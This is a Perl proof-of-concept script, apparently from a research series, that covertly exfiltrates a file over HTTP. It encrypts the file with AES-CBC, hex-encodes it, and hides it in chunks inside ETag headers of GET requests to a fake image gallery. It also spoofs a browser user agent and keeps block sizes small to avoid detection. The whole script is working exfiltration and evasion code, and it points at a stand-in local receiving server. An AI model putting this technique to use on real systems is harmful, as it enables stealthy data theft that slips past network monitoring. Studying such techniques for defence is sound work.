#!/usr/bin/perl

# Released under GPL 3.0

# Exfiltration POC with Mojolicious
# Inside script #1
# Codename Ethel

# Hendrik Van Belleghem
# hendrik.vanbelleghem@gmail.com

# This script exfils a file into the HTTP header for a GET request to a mock gallery page
# Rudimentary handshake information is stored in call to 'index page'
# Data is stored in the 'image requests'

# Handshake data is sent is clear text (for now)
# Exfil data is encoded with (for now) a simple hex conversion

# Parameters used:
# b: number of blocks
# bs: block size
# h: header tag
# fn: filename
# fs: filesize
# f: format
# e: encryption

# This script uses Mojolicious UserAgent (http://mojolicious.org)
# The outside server process obviously needs to know how to interpret the header data
# Packet content is ignored

# Improvements over Anna & Boris:
# - Browser signature less suspicious
# - Encrypted with PSK
# - Should work with all CBC supported ciphers

# For some reason, this breaks when running the same script again without restarting the server. This, most likely, has to do with invalid salting
# Fix coming soon

use Mojo::UserAgent;
use Crypt::CBC;

my $blocksize = 1024; # HTTP headers typically are limited. Not to raise red flags, keep this low
my $filename = "in.txt"; # Sample text: The Raven by Edgar Allen Poe
my $format = "h"; # HEX - May add some other ones later
my $encryption = "Rijndael"; # use Crypt::Rijndael in Crypt::CBC
my $crypted;

my $psk = "Quote the Raven"; # Pre-shared key 
if ($format eq "h") { $blocksize /= 2; } # Double char use for hex. Div by 2

my $cipher = Crypt::CBC->new(-key => $psk,
			     -cipher => $encryption,
			     -salt   => 1,
			    ) || die "Couldn't create CBC object";

open (INFILE, "<$filename") || die $!; 
{ local $/; $data_raw = <INFILE>; }
$crypted = $cipher->encrypt_hex($data_raw);
close(INFILE);

my $filesize = length($crypted);
$blocks = sprintf "%.0f", $filesize / $blocksize; # Round up

my $indexpath = "localhost:8080/gallery/page/"; # Adjust per file?!?
my $imagepath = "localhost:8080/gallery/image/"; # Adjust per file?!?

my $ua = Mojo::UserAgent->new;
$ua->transactor->name("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36");
my $tx = $ua->get($indexpath."X" =>
{ etag => "b:$blocks;bs:$blocksize;h:etag;fn:$filename;fs:$filesize;f:$format;e:aes"} # Generate handshake - cleartext
);
my $res = $tx->result; # Ignore - This is is a POC after all

my @data = $crypted =~ m[.{1,$blocksize}]g;

my $i = 0;
if ($res->is_success) # At least we check for 200 for handshake
{ for my $data ( @data )
  { my $tx = $ua->get("$imagepath$i.png" => # Send GET requests with hex'ed exfil data
    { etag => $data }
    );
    my $res = $tx->result;
    print $res->message;
    $i++;
  }
}